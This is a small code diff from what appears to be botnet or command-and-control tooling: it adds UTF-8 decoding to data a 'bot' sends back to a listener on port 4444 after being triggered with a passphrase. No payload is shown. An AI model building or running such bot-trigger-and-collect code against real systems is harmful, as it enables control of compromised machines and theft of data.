@@ -37,7 +37,7 @@ def test():
         try:
             trigger(bot_ip, bot_passphrase)
             print("[*] Bot has been triggered")
-            data = listner(system_ip, 4444)
+            data = listner(system_ip, 4444).decode('utf-8')
             print("Data fetched from the bot: ")
             print(data)
         except:
